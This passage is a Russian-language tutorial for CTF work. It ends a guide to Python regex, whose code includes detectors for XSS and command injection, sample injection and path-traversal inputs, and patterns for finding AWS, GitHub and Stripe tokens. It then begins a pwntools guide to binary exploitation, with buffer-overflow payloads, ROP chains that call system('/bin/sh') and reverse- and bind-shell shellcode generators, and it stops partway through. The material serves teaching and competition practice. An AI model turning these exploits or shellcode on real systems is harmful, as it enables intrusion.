        # 4. Попытка XSS (упрощённо)
        xss_patterns = ['<script>', 'alert(', 'onerror=', 'javascript:']
        if any(pattern in request.lower() for pattern in xss_patterns):
            suspicious = True
            reason.append('Возможный XSS')
        
        # 5. Попытка command injection
        if any(cmd in request.lower() for cmd in ['cmd=', 'exec=', 'system=', '|', ';', '&&']):
            suspicious = True
            reason.append('Возможная command injection')
        
        # 6. Нестандартные методы
        if request.startswith('CONNECT'):
            suspicious = True
            reason.append('Метод CONNECT')
        
        # 7. Подозрительные user agents
        if 'bot.html' in user_agent and 'Google' not in user_agent:
            suspicious = True
            reason.append('Подозрительный User-Agent')
        
        if suspicious:
            suspicious_requests.append((ip, request, status, reason))
    
    # Вывод результатов
    for i, (ip, request, status, reasons) in enumerate(suspicious_requests, 1):
        print(f"\n#{i} Подозрительный запрос:")
        print(f"   IP: {ip}")
        print(f"   Запрос: {request[:50]}{'...' if len(request) > 50 else ''}")
        print(f"   Статус: {status}")
        print(f"   Причины: {', '.join(reasons)}")
    
    # Найденные флаги
    if found_flags:
        print(f"\nНайденные флаги в логах ({len(found_flags)}):")
        for flag in found_flags:
            print(f"   - {flag}")
    
    # Статистика
    print(f"\nСтатистика:")
    print(f"   Всего запросов: {len(list(log_pattern.finditer(network_dump)))}")
    print(f"   Подозрительных запросов: {len(suspicious_requests)}")
    print(f"   Найденных флагов: {len(found_flags)}")
    
    # Поиск уникальных IP
    unique_ips = set()
    for match in log_pattern.finditer(network_dump):
        unique_ips.add(match.group('ip'))
    
    print(f"   Уникальных IP: {len(unique_ips)}")
    
    # Анализ статус кодов
    status_codes = {}
    for match in log_pattern.finditer(network_dump):
        status = match.group('status')
        status_codes[status] = status_codes.get(status, 0) + 1
    
    print(f"\nРаспределение статус кодов:")
    for code, count in sorted(status_codes.items()):
        print(f"   {code}: {count}")

analyze_network_dumps()
```

## 5. Производительность и оптимизация

### Сравнение методов и оптимизация

```python
def performance_comparison():
    """Сравнение производительности разных методов и оптимизация"""
    
    import time
    
    # Большой объём данных для тестирования
    large_text = "CTF{" + "a" * 1000 + "}" + "\n" * 10000
    large_text += "FLAG{" + "b" * 1000 + "}" + "\n" * 10000
    large_text += "flag{" + "c" * 1000 + "}" * 100
    
    pattern = r'(?:CTF|FLAG|flag)\{[^}]+\}'
    
    print("Сравнение производительности:")
    print("=" * 60)
    
    # Тест 1: search vs match vs fullmatch
    test_string = "CTF{test_flag}"
    
    times = {}
    
    # search
    start = time.perf_counter()
    for _ in range(10000):
        re.search(pattern, test_string)
    times['search'] = time.perf_counter() - start
    
    # match
    start = time.perf_counter()
    for _ in range(10000):
        re.match(pattern, test_string)
    times['match'] = time.perf_counter() - start
    
    # fullmatch
    start = time.perf_counter()
    for _ in range(10000):
        re.fullmatch(pattern, test_string)
    times['fullmatch'] = time.perf_counter() - start
    
    print("\n1. Поиск в короткой строке (10000 итераций):")
    for method, t in sorted(times.items(), key=lambda x: x[1]):
        print(f"   {method:10}: {t:.4f} сек")
    
    # Тест 2: findall vs finditer
    times = {}
    
    # findall
    start = time.perf_counter()
    for _ in range(100):
        re.findall(pattern, large_text)
    times['findall'] = time.perf_counter() - start
    
    # finditer
    start = time.perf_counter()
    for _ in range(100):
        list(re.finditer(pattern, large_text))
    times['finditer'] = time.perf_counter() - start
    
    print("\n2. Поиск всех совпадений (100 итераций):")
    for method, t in sorted(times.items(), key=lambda x: x[1]):
        print(f"   {method:10}: {t:.4f} сек")
    
    # Тест 3: Компиляция vs без компиляции
    times = {}
    
    # Без компиляции
    start = time.perf_counter()
    for _ in range(100):
        re.findall(pattern, large_text)
    times['без компиляции'] = time.perf_counter() - start
    
    # С компиляцией
    compiled = re.compile(pattern)
    start = time.perf_counter()
    for _ in range(100):
        compiled.findall(large_text)
    times['с компиляцией'] = time.perf_counter() - start
    
    print("\n3. Компиляция паттерна:")
    for method, t in sorted(times.items(), key=lambda x: x[1]):
        print(f"   {method:20}: {t:.4f} сек")
    
    # Тест 4: Жадные vs ленивые квантификаторы
    test_html = "<div>Content</div>" * 1000
    
    # Жадный
    greedy_pattern = r'<.*>'
    start = time.perf_counter()
    re.findall(greedy_pattern, test_html)
    greedy_time = time.perf_counter() - start
    
    # Ленивый
    lazy_pattern = r'<.*?>'
    start = time.perf_counter()
    re.findall(lazy_pattern, test_html)
    lazy_time = time.perf_counter() - start
    
    print("\n4. Жадные vs ленивые квантификаторы:")
    print(f"   Жадный (.*):  {greedy_time:.4f} сек")
    print(f"   Ленивый (.*?): {lazy_time:.4f} сек")
    print(f"   Разница: {abs(greedy_time - lazy_time):.4f} сек")
    
    # Рекомендации по оптимизации
    print("\n" + "=" * 60)
    print("Рекомендации по оптимизации регулярных выражений:")
    print("1. Всегда компилируйте паттерны при многократном использовании")
    print("2. Используйте нежадные квантификаторы, когда возможно")
    print("3. Избегайте backtracking (особенно вложенных квантификаторов)")
    print("4. Используйте атомарные группы (?>...) для предотвращения backtracking")
    print("5. Предпочитайте простые классы символов сложным")
    print("6. Используйте finditer для обработки больших данных (ленивая загрузка)")

performance_comparison()
```

## 6. Практические задания для CTF

```python
def ctf_practice_challenges():
    """Практические задания для отработки навыков работы с regex"""
    
    print("Практические задания CTF по регулярным выражениям:")
    print("=" * 60)
    
    # Задание 1: Извлечение данных из смешанного текста
    challenge1_data = """
    User Data:
    Name: John Doe
    Email: john.doe@example.com
    Phone: +1 (555) 123-4567
    Secret: CTF{extract_all_emails}
    Backup Email: johndoe123@gmail.com
    Invalid: not-an-email@invalid
    """
    
    print("\nЗадание 1: Извлеките все email адреса")
    print("Данные:")
    print(challenge1_data)
    
    # Решение
    email_pattern = r'[\w\.-]+@[\w\.-]+\.\w+'
    emails = re.findall(email_pattern, challenge1_data)
    print(f"Найдено email: {emails}")
    
    # Задание 2: Парсинг сложного формата
    challenge2_data = """
    [2023-12-25 10:30:45] LOGIN SUCCESS user="admin" ip="192.168.1.1"
    [2023-12-25 10:30:46] LOGIN FAILED user="attacker" ip="10.0.0.1" reason="wrong password"
    [2023-12-25 10:30:47] FILE UPLOAD user="admin" file="secret.txt" size="12345"
    [2023-12-25 10:30:48] FLAG ACCESS user="admin" flag="CTF{parse_logs_properly}"
    """
    
    print("\n\nЗадание 2: Парсинг структурированных логов")
    print("Извлеките все события FAILED и значения флага")
    
    # Решение
    log_pattern = r'\[([^\]]+)\]\s+(\w+\s+\w+)\s+user="([^"]+)"(?:.*?flag="([^"]+)")?'
    
    print("\nРезультат парсинга:")
    for match in re.finditer(log_pattern, challenge2_data):
        timestamp, event, user, flag = match.groups()
        if 'FAILED' in event or flag:
            status = "🔴 FAILED" if 'FAILED' in event else "🟢 OK"
            flag_info = f", Флаг: {flag}" if flag else ""
            print(f"  {timestamp} {status} user={user}{flag_info}")
    
    # Задание 3: Деобфускация
    challenge3_data = """
    <script>
    var a = "CTF{";
    var b = "javascript";
    var c = "_obfuscation";
    var d = "}";
    eval(a + b + c + d);
    </script>
    
    <!-- Hidden: CTF{html_comment_flag} -->
    
    <?php
    // $flag = "CTF{php_flag}";
    echo base64_decode("Q1RGe2Jhc2U2NF9mbGFnfQ==");
    ?>
    
    # Python code
    flag_part1 = "CTF{python"
    flag_part2 = "_"
    flag_part3 = "concatenation"
    flag_part4 = "}"
    """
    
    print("\n\nЗадание 3: Найдите все флаги в обфусцированном коде")
    
    # Решение - нужно найти все флаги, включая собранные
    # Сначала найдём явные флаги
    explicit_flags = re.findall(r'CTF\{[^}]+\}', challenge3_data)
    
    # Найдём части флагов
    flag_parts = re.findall(r'["\'](CTF\{[^}"\']*|[^}"\']*_?[^}"\']*\}?)["\']', challenge3_data)
    
    print(f"Явные флаги: {explicit_flags}")
    print(f"Части флагов: {flag_parts}")
    
    # Попробуем собрать
    possible_flags = []
    current_flag = ""
    
    for part in flag_parts:
        if part.startswith('CTF{'):
            if current_flag:
                possible_flags.append(current_flag)
            current_flag = part
        elif part.endswith('}'):
            current_flag += part
            possible_flags.append(current_flag)
            current_flag = ""
        elif current_flag:
            current_flag += part
    
    print(f"Собранные флаги: {possible_flags}")
    
    # Задание 4: Валидация и фильтрация
    print("\n\nЗадание 4: Валидация ввода пользователя")
    print("Отфильтруйте небезопасные символы, но оставьте флаги CTF")
    
    user_inputs = [
        "Normal input",
        "<script>alert('xss')</script>",
        "CTF{valid_flag}",
        "'; DROP TABLE users; --",
        "CTF{another_flag} with <b>HTML</b>",
        "../../etc/passwd",
        "CTF{flag_with_special_chars!@#$}",
    ]
    
    # Безопасный паттерн: разрешаем буквы, цифры, пробелы и флаги CTF
    safe_pattern = r'(?:[a-zA-Z0-9\s]|CTF\{[^}]+\})'
    
    print("\nФильтрация ввода:")
    for input_str in user_inputs:
        # Собираем только безопасные части
        safe_parts = re.findall(safe_pattern, input_str)
        filtered = ''.join(safe_parts)
        
        # Проверяем, остались ли флаги
        flags_in_filtered = re.findall(r'CTF\{[^}]+\}', filtered)
        
        print(f"  Оригинал: {input_str[:30]}...")
        print(f"  Фильтрованный: {filtered[:30]}...")
        if flags_in_filtered:
            print(f"  Сохранённые флаги: {flags_in_filtered}")
        print()

ctf_practice_challenges()
```

## 7. Ограничения и альтернативы

```python
def limitations_and_alternatives():
    """Ограничения регулярных выражений и альтернативы"""
    
    print("Ограничения регулярных выражений:")
    print("=" * 60)
    
    # 1. Регулярные выражения не могут парсить вложенные структуры
    nested_html = "<div><span>Text</span></div>"
    
    # НЕВЕРНО - попытка найти все теги
    print("\n1. Проблема вложенных тегов:")
    greedy_match = re.findall(r'<.*>', nested_html)
    print(f"   Жадный поиск: {greedy_match}")  # ['<div><span>Text</span></div>']
    
    lazy_match = re.findall(r'<.*?>', nested_html)
    print(f"   Ленивый поиск: {lazy_match}")   # ['<div>', '<span>', '</span>', '</div>']
    
    print("   Проблема: невозможно сопоставить открывающие и закрывающие теги")
    
    # 2. Сложные валидации
    print("\n2. Сложные валидации (например, email):")
    
    # Простой regex для email (неполный)
    simple_email_regex = r'^[\w\.-]+@[\w\.-]+\.\w+$'
    
    test_emails = [
        "user@example.com",          # ✓
        "user@sub.example.co.uk",    # ✓
        "user@localhost",            # ✗ (нет домена верхнего уровня)
        "user@example.toolongtld",   # ✗ (слишком длинный TLD)
        "@example.com",              # ✗ (нет имени пользователя)
        "user@.com",                 # ✗ (нет домена)
        "user@-example.com",         # ✗ (дефис в начале домена)
    ]
    
    print("   Тест email валидации:")
    for email in test_emails:
        is_valid = bool(re.match(simple_email_regex, email))
        status = "✓" if is_valid else "✗"
        print(f"     {status} {email}")
    
    print("   Вывод: regex не идеален для сложной валидации email")
    
    # 3. Альтернативы для HTML парсинга
    print("\n3. Альтернативы для HTML парсинга:")
    
    html_content = """
    <html>
        <body>
            <div class="content">
                <p>Flag: <span id="flag">CTF{use_proper_tools}</span></p>
                <a href="/next">Next page</a>
            </div>
        </body>
    </html>
    """
    
    print("   Сравнение подходов:")
    
    # Способ 1: Регулярные выражения (ограниченно)
    regex_flag = re.search(r'CTF\{[^}]+\}', html_content)
    print(f"   Regex: {regex_flag.group() if regex_flag else 'Not found'}")
    
    # Способ 2: BeautifulSoup (рекомендуется для HTML)
    try:
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(html_content, 'html.parser')
        bs_flag = soup.find(id='flag')
        print(f"   BeautifulSoup: {bs_flag.text if bs_flag else 'Not found'}")
    except ImportError:
        print("   BeautifulSoup: не установлен (pip install beautifulsoup4)")
    
    # 4. Альтернативы для JSON парсинга
    print("\n4. Альтернативы для JSON парсинга:")
    
    json_data = """
    {
        "user": "admin",
        "flags": ["CTF{json_flag_1}", "CTF{json_flag_2}"],
        "metadata": {
            "timestamp": "2023-12-25",
            "challenge": "regex_master"
        }
    }
    """
    
    print("   Сравнение подходов:")
    
    # Способ 1: Регулярные выражения
    json_regex_flags = re.findall(r'CTF\{[^}]+\}', json_data)
    print(f"   Regex: найдено {len(json_regex_flags)} флагов")
    
    # Способ 2: Стандартный json модуль
    import json
    try:
        parsed_json = json.loads(json_data)
        json_flags = parsed_json.get('flags', [])
        print(f"   JSON модуль: найдено {len(json_flags)} флагов")
    except:
        print("   JSON модуль: ошибка парсинга")
    
    # 5. Когда использовать регулярные выражения
    print("\n" + "=" * 60)
    print("Когда ИСПОЛЬЗОВАТЬ регулярные выражения:")
    print("1. Поиск простых паттернов в тексте")
    print("2. Замена/удаление шаблонных фрагментов")
    print("3. Валидация форматов (телефоны, IP, и т.д.)")
    print("4. Извлечение данных из неструктурированного текста")
    print("5. Лексический анализ (простые парсеры)")
    
    print("\nКогда НЕ использовать регулярные выражения:")
    print("1. Парсинг HTML/XML (используйте BeautifulSoup, lxml)")
    print("2. Парсинг JSON (используйте json модуль)")
    print("3. Сложная валидация (используйте специализированные библиотеки)")
    print("4. Вложенные структуры")
    print("5. Контекстно-зависимые языки")

limitations_and_alternatives()
```

## 8. Шпаргалка и полезные паттерны

```python
def regex_cheatsheet():
    """Шпаргалка по регулярным выражениям для CTF"""
    
    print("Шпаргалка по регулярным выражениям для CTF:")
    print("=" * 60)
    
    cheatsheet = {
        "Флаги CTF": [
            (r'CTF\{[^}]+\}', "Стандартный формат CTF"),
            (r'FLAG\{[^}]+\}', "Формат с FLAG"),
            (r'(?i)(?:ctf|flag)\{[^}]+\}', "Любой регистр"),
            (r'[Cc][Tt][Ff]\{[^}]+\}', "Case-insensitive вручную"),
        ],
        
        "Криптография": [
            (r'[A-Za-z0-9+/]{4,}={0,2}', "Base64 (минимум 4 символа)"),
            (r'0x[0-9a-fA-F]+', "Hex строка"),
            (r'[0-9a-fA-F]{32}', "MD5 хеш"),
            (r'[0-9a-fA-F]{40}', "SHA-1"),
            (r'[0-9a-fA-F]{64}', "SHA-256"),
            (r'[0-9a-fA-F]{128}', "SHA-512"),
            (r'[A-Z2-7]+=*', "Base32"),
            (r'[A-Za-z0-9_-]{21,}', "JWT токен (часть)"),
        ],
        
        "Сети и логи": [
            (r'\b(?:\d{1,3}\.){3}\d{1,3}\b', "IPv4 адрес (простой)"),
            (r'\b(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.'
             r'(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.'
             r'(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.'
             r'(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\b', "IPv4 (точный)"),
            (r'[0-9a-fA-F:]+', "IPv6 (упрощённо)"),
            (r'\b\d{1,5}\b', "Порт (0-65535)"),
            (r'\[\d{2}/\w{3}/\d{4}:\d{2}:\d{2}:\d{2}', "Время в логах"),
        ],
        
        "Веб и HTML": [
            (r'<[^>]+>', "HTML тег (простой)"),
            (r'href=["\']([^"\']+)["\']', "Ссылки"),
            (r'src=["\']([^"\']+)["\']', "Источники"),
            (r'<!--(.*?)-->', "HTML комментарии"),
            (r'[\w\.-]+@[\w\.-]+\.\w+', "Email адреса"),
            (r'https?://[^\s<>"\']+', "URL (HTTP/HTTPS)"),
        ],
        
        "Токены и ключи": [
            (r'(?:token|key|secret|password)\s*[=:]\s*["\']([^"\']+)["\']', "Ключи в коде"),
            (r'[A-Za-z0-9_-]{15,}', "Длинные токены"),
            (r'sk_[a-zA-Z0-9]{24}', "Stripe ключ"),
            (r'AKIA[0-9A-Z]{16}', "AWS ключ"),
            (r'gh[ops]_[A-Za-z0-9]{36}', "GitHub токен"),
            (r'xox[baprs]-[0-9a-zA-Z]{10,48}', "Slack токен"),
        ],
        
        "Полезные техники": [
            (r'(?=.*[A-Z])(?=.*[a-z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}', "Сложный пароль"),
            (r'\b(\w+)\b(?=.*\b\1\b)', "Повторяющиеся слова"),
            (r'^\s*$', "Пустая строка или только пробелы"),
            (r'^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$', "Email RFC 5322"),
            (r'(\d{3})-(\d{3})-(\d{4})', "Телефон США"),
        ],
    }
    
    for category, patterns in cheatsheet.items():
        print(f"\n{category}:")
        for pattern, description in patterns:
            # Обрезаем длинные паттерны для отображения
            display_pattern = pattern[:50] + ("..." if len(pattern) > 50 else "")
            print(f"  {display_pattern:55} - {description}")

regex_cheatsheet()
```

## Заключение

Библиотека `re` — это **мощнейший инструмент** для работы с текстом в Python, особенно полезный в CTF и задачах ИБ. Ключевые моменты:

1. **Основные функции:**
   - `search()` — первое совпадение в любом месте
   - `match()` — совпадение в начале строки
   - `findall()` — все совпадения (список)
   - `finditer()` — итератор объектов match
   - `sub()` — замена совпадений
   - `compile()` — компиляция для многократного использования

2. **Для CTF наиболее полезны:**
   - Поиск флагов: `CTF\{[^}]+\}` или `(?:CTF|FLAG|flag)\{[^}]+\}`
   - Парсинг логов: использование групп для извлечения полей
   - Анализ HTML: поиск скрытых данных, токенов
   - Валидация: проверка форматов данных

3. **Важные техники:**
   - Используйте **нежадные квантификаторы** (`*?`, `+?`) когда возможно
   - **Компилируйте** паттерны при многократном использовании
   - Используйте **именованные группы** для читаемости
   - Знайте **ограничения** regex (непарсируют вложенные структуры)

4. **Производительность:**
   - `finditer()` лучше для больших данных (ленивая загрузка)
   - Компиляция ускоряет повторное использование
   - Избегайте catastrophic backtracking

**Практический совет для CTF:** Начните с простых паттернов, используйте интерактивные тестеры regex (например, regex101.com) для отладки, и помните — иногда проще написать несколько простых regex чем один сложный.

# Исчерпывающее руководство по`pwntools`(pwn) для CTF и бинарной эксплуатации

`pwntools` — это фреймворк для создания эксплойтов на Python, созданный специально для CTF и задач бинарной эксплуатации. Он не является стандартной библиотекой Python, но **абсолютно незаменим** для задач категорий Pwn, Binary и Reverse Engineering.

## 1. Установка и настройка

### Установка
```bash
# Основная установка
pip install pwntools

# Или для полной функциональности
pip install --upgrade pwntools

# Для Arch Linux
pacman -S pwntools

# Из исходников
git clone https://github.com/Gallopsled/pwntools
cd pwntools
pip install -e .
```

### Проверка установки
```python
from pwn import *
print(pwnlib.__version__)  # Должен вывести версию
```

## 2. Архитектура pwntools: основные модули

| Модуль | Назначение | Основные функции |
|--------|------------|------------------|
| `pwnlib.tubes` | Работа с подключениями | `remote()`, `process()`, `listen()` |
| `pwnlib.elf` | Анализ ELF-файлов | `ELF()`, `symbols`, `plt`, `got` |
| `pwnlib.util` | Утилиты и упаковка | `packing`, `cyclic`, `fiddling` |
| `pwnlib.rop` | Построение ROP-цепочек | `ROP()`, `gadgets` |
| `pwnlib.shellcraft` | Генерация шеллкода | `shellcraft.sh()`, `shellcraft.execve()` |
| `pwnlib.gdb` | Интеграция с отладчиком | `attach()`, `debug()` |
| `pwnlib.asm` | Ассемблер/дизассемблер | `asm()`, `disasm()` |

## 3. Детальное руководство по каждому модулю

### 3.1. `pwnlib.tubes` — работа с подключениями

#### `remote()` — подключение к удалённому сервису
```python
from pwn import *

# Базовое подключение
r = remote('ctf.example.com', 1337)

# С таймаутом
r = remote('ctf.example.com', 1337, timeout=5)

# С SSL/TLS
r = remote('ssl-server.example.com', 443, ssl=True)

# Получение/отправка данных
r.send(b'Hello\n')           # Отправка байтов
r.sendline(b'Hello')         # Отправка + \n
r.sendlineafter(b'> ', b'1') # Отправить после получения паттерна

data = r.recv(1024)          # Получить до 1024 байт
data = r.recvline()          # Получить строку (до \n)
data = r.recvuntil(b'!')     # Получить до паттерна
data = r.recvall()           # Получить всё до закрытия

# Интерактивный режим
r.interactive()              # Передать управление пользователю

# Закрытие
r.close()
```

#### `process()` — запуск локального бинарника
```python
from pwn import *

# Запуск бинарника
p = process('./vuln')

# С аргументами
p = process(['./vuln', 'arg1', 'arg2'])

# С переменными окружения
p = process('./vuln', env={'PATH': '/bin:/usr/bin'})

# С перенаправлением stdio
p = process('./vuln', stdin=PTY, stdout=PTY, stderr=PTY)

# Работа аналогично remote()
p.sendline(b'input')
print(p.recvline())

# Получение PID
print(f"PID: {p.pid}")

# Завершение
p.kill()
p.wait()  # Ожидание завершения
```

#### `listen()` — создание сервера
```python
from pwn import *

# Создание TCP-сервера
l = listen(9999)
print(f"Listening on {l.lhost}:{l.lport}")

# Ожидание подключения
conn = l.wait_for_connection()
print(f"Connection from {conn.remote}")

# Работа с подключением
conn.sendline(b'Welcome!')
conn.close()

# UDP сервер
l = listen(9999, typ='udp')
```

### 3.2. `pwnlib.util.packing` — упаковка данных

#### Основные функции
```python
from pwn import *

# Упаковка чисел (аналог struct.pack)
p8(0x41)      # b'A' (1 байт)
p16(0x4142)   # b'BA' (little-endian)
p32(0x41424344) # b'DCBA' (little-endian)
p64(0x4142434445464748) # b'HGFEDCBA' (little-endian)

# Big-endian варианты
p16(0x4142, endian='big')  # b'AB'
p32be(0x41424344)          # b'ABCD'
p64be(0x4142434445464748) # b'ABCDEFGH'

# Распаковка (аналог struct.unpack)
u8(b'A')       # 65 (0x41)
u16(b'BA')     # 0x4142
u32(b'DCBA')   # 0x41424344
u64(b'HGFEDCBA') # 0x4142434445464748

# Распаковка из строки с адресом
u32(b'XXX\xef\xbe\xad\xdeYYY', offset=3)  # 0xdeadbeef

# Размеры
p8.size   # 1
p16.size  # 2
p32.size  # 4
p64.size  # 8

# Пример использования в эксплойте
def create_exploit():
    payload = b'A' * 64          # Мусор
    payload += p32(0xdeadbeef)   # Перезаписываем адрес возврата
    payload += p32(0xcafebabe)   # Второй адрес
    return payload
```

#### `cyclic()` и `cyclic_find()` — для поиска смещений
```python
from pwn import *

# Генерация циклической последовательности
pattern = cyclic(100)  # aaaabaaacaaadaaaeaaaf...
print(pattern[:20])    # b'aaaabaaacaaadaaaeaa'

# Поиск смещения по значению
offset = cyclic_find(0x61616164)  # 'aaad' в little-endian
print(f"Offset: {offset}")       # 12

# Алфавит для циклической последовательности
pattern = cyclic(50, alphabet=string.ascii_uppercase)
print(pattern[:30])  # b'AAAABAAACAAADAAAEAAAFAAAGAAAH'

# Поиск в циклической последовательности
def find_offset(crash_value):
    """Найти смещение по значению, которое перезаписывает RIP/EIP"""
    if isinstance(crash_value, str):
        crash_value = int(crash_value, 16)
    
    offset = cyclic_find(crash_value & 0xffffffff)
    if offset == -1:
        # Попробовать как 64-битное значение
        offset = cyclic_find(crash_value & 0xffffffffffffffff)
    
    return offset

# Использование в реальном эксплойте
def exploit_binary():
    # 1. Генерируем payload с циклической последовательностью
    p = process('./vuln')
    pattern = cyclic(200)
    p.sendline(pattern)
    
    # 2. Получаем значение, которое перезаписало RIP/EIP
    # (обычно из отладчика или сообщения об ошибке)
    crash_value = 0x61616167  # 'aaag'
    
    # 3. Находим смещение
    offset = cyclic_find(crash_value)
    print(f"Offset to return address: {offset}")
    
    # 4. Создаём финальный эксплойт
    payload = b'A' * offset
    payload += p64(0x401236)  # Адрес функции win()
    p.sendline(payload)
    p.interactive()
```

### 3.3. `pwnlib.elf` — работа с ELF-файлами

#### Загрузка и анализ ELF
```python
from pwn import *

# Загрузка ELF-файла
elf = ELF('./vuln')

# Базовые свойства
print(f"Entry point: 0x{elf.entry:x}")
print(f"Architecture: {elf.arch}")  # i386, amd64, arm, etc.
print(f"Bits: {elf.bits}")          # 32 или 64
print(f"Endianness: {elf.endian}")  # little или big

# Поиск символов
print(f"main: 0x{elf.symbols['main']:x}")
print(f"puts: 0x{elf.plt['puts']:x}")

# Получение адресов функций
win_addr = elf.symbols['win']          # Функция win()
system_addr = elf.plt['system']        # system() из PLT
puts_got = elf.got['puts']             # Адрес puts в GOT
printf_got = elf.got['printf']         # Адрес printf в GOT

# Поиск строк
str_addr = next(elf.search(b'/bin/sh\x00'))  # Поиск строки /bin/sh
print(f"/bin/sh at 0x{str_addr:x}")

# Чтение секций
text_section = elf.get_section_by_name('.text')
print(f".text: 0x{text_section.header.sh_addr:x}")

# Проверка защит
print(f"PIE enabled: {elf.pie}")      # Position Independent Executable
print(f"NX enabled: {elf.nx}")        # Non-eXecutable stack
print(f"Canary present: {elf.canary}") # Stack canary
print(f"RELRO: {elf.relro}")          # RELRO level (None/Partial/Full)

# Автоматический поиск ROP-гаджетов
rop = ROP(elf)
print(rop.gadgets)  # Все найденные гаджеты
```

#### Поиск уязвимостей в ELF
```python
from pwn import *

def analyze_binary(path):
    """Автоматический анализ бинарника на уязвимости"""
    elf = ELF(path)
    results = {
        'path': path,
        'arch': elf.arch,
        'protections': {},
        'vulnerabilities': []
    }
    
    # Анализ защит
    results['protections']['PIE'] = elf.pie
    results['protections']['NX'] = elf.nx
    results['protections']['Canary'] = elf.canary
    results['protections']['RELRO'] = elf.relro
    
    # Поиск опасных функций
    dangerous_funcs = ['gets', 'scanf', 'strcpy', 'strcat', 
                      'sprintf', 'system', 'execve']
    
    for func in dangerous_funcs:
        if func in elf.symbols or func in elf.plt:
            results['vulnerabilities'].append(f"Dangerous function: {func}")
    
    # Поиск строки /bin/sh
    binsh = next(elf.search(b'/bin/sh'), None)
    if binsh:
        results['vulnerabilities'].append(f"/bin/sh at 0x{binsh:x}")
    
    # Поиск format strings
    format_strings = [b'%s', b'%n', b'%x', b'%p']
    for fmt in format_strings:
        addr = next(elf.search(fmt), None)
        if addr:
            results['vulnerabilities'].append(f"Format string {fmt} at 0x{addr:x}")
    
    # Анализ импортов
    if 'gets' in elf.plt:
        results['vulnerabilities'].append("Imported gets() - possible buffer overflow")
    
    return results

# Использование
analysis = analyze_binary('./vuln')
print("Binary Analysis:")
print(f"Architecture: {analysis['arch']}")
print("Protections:")
for prot, value in analysis['protections'].items():
    print(f"  {prot}: {value}")
print("Vulnerabilities:")
for vuln in analysis['vulnerabilities']:
    print(f"  - {vuln}")
```

### 3.4. `pwnlib.rop` — построение ROP-цепочек

#### Базовое использование
```python
from pwn import *

context.binary = './vuln'
elf = ELF('./vuln')
rop = ROP(elf)

# Добавление гаджетов в цепочку
rop.raw(b'A' * 64)              # Заполнение буфера
rop.call(elf.symbols['win'], [0xdeadbeef])  # Вызов win(0xdeadbeef)

# Для системных вызовов
rop.puts(elf.got['puts'])       # puts(puts@got)
rop.exit(0)                     # exit(0)

# Для execve
rop.execve(next(elf.search(b'/bin/sh\x00')), 0, 0)

# Генерация payload
payload = rop.chain()
print(rop.dump())               # Декомпиляция цепочки

# Использование
p = process('./vuln')
p.sendline(payload)
p.interactive()
```

#### Сложные ROP-цепочки
```python
from pwn import *

def create_rop_chain():
    """Создание сложной ROP-цепочки для обхода защит"""
    elf = ELF('./vuln')
    rop = ROP(elf)
    
    # Если PIE включен, нужен leak адреса
    if elf.pie:
        # 1. Ликуем адрес puts из GOT
        rop.puts(elf.got['puts'])
        rop.call(elf.symbols['main'])  # Возвращаемся в main для повторной атаки
        
        # Отправляем первую часть
        p = process('./vuln')
        p.sendline(rop.chain())
        
        # Получаем ликнутый адрес
        leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
        elf.address = leaked - elf.symbols['puts']
        print(f"ELF base: 0x{elf.address:x}")
        
        # 2. Создаём финальную цепочку с правильными адресами
        rop = ROP(elf)
    
    # Если есть canary, нужно его обойти
    if elf.canary:
        # Стратегия: лик canary через format string или переполнение
        rop.call(elf.symbols['leak_function'])
        # ... сложная логика обхода canary
    
    # Финальная цепочка
    rop.call(elf.symbols['system'], [next(elf.search(b'/bin/sh\x00'))])
    
    return rop.chain()

# Автоматический поиск гаджетов
def find_useful_gadgets(elf):
    """Поиск полезных ROP-гаджетов"""
    rop = ROP(elf)
    
    useful = {
        'pop_rdi': None,
        'pop_rsi': None,
        'pop_rdx': None,
        'pop_rax': None,
        'syscall': None,
        'ret': None
    }
    
    for addr, gadget in rop.gadgets.items():
        instr = gadget[0]  # Первая инструкция гаджета
        
        if 'pop rdi' in instr and 'ret' in gadget[-1]:
            useful['pop_rdi'] = addr
        elif 'pop rsi' in instr and 'ret' in gadget[-1]:
            useful['pop_rsi'] = addr
        elif 'pop rdx' in instr and 'ret' in gadget[-1]:
            useful['pop_rdx'] = addr
        elif 'pop rax' in instr and 'ret' in gadget[-1]:
            useful['pop_rax'] = addr
        elif 'syscall' in instr and 'ret' in gadget[-1]:
            useful['syscall'] = addr
        elif instr == 'ret':
            useful['ret'] = addr
    
    return useful

# Использование
elf = ELF('./vuln')
gadgets = find_useful_gadgets(elf)
print("Found gadgets:")
for name, addr in gadgets.items():
    if addr:
        print(f"  {name}: 0x{addr:x}")
```

### 3.5. `pwnlib.shellcraft` — генерация шеллкода

#### Генерация шеллкодов для разных архитектур
```python
from pwn import *

# Установка архитектуры
context.arch = 'amd64'  # или 'i386', 'arm', 'aarch64', 'mips'

# Базовые шеллкоды
shellcode = shellcraft.sh()                    # /bin/sh
shellcode = shellcraft.execve('/bin/sh', 0, 0) # execve('/bin/sh', NULL, NULL)
shellcode = shellcraft.cat('flag.txt')         # cat flag.txt
shellcode = shellcraft.dupsh()                 # dup2(sockfd, 0,1,2) + sh()

# Для Linux x86_64
context.arch = 'amd64'
sc_amd64 = asm(shellcraft.sh())
print(f"AMD64 shellcode length: {len(sc_amd64)}")
print(sc_amd64.hex())

# Для Linux x86
context.arch = 'i386'
sc_i386 = asm(shellcraft.sh())
print(f"\ni386 shellcode length: {len(sc_i386)}")
print(sc_i386.hex())

# Для ARM
context.arch = 'arm'
sc_arm = asm(shellcraft.sh())
print(f"\nARM shellcode length: {len(sc_arm)}")

# Сложные шеллкоды
def create_reverse_shell(ip, port):
    """Создание reverse shell шеллкода"""
    context.arch = 'amd64'
    
    # Подключаемся обратно к атакующему
    shellcode = shellcraft.connect(ip, port)
    shellcode += shellcraft.dupsh()  # Перенаправляем stdio в сокет
    
    return asm(shellcode)

def create_bind_shell(port):
    """Создание bind shell шеллкода"""
    context.arch = 'amd64'
    
    # Открываем порт и слушаем подключения
    shellcode = shellcraft.bindsh(port)
    
    return asm(shellcode)

# Пример использования
ip = '127.0.0.1'
port = 4444

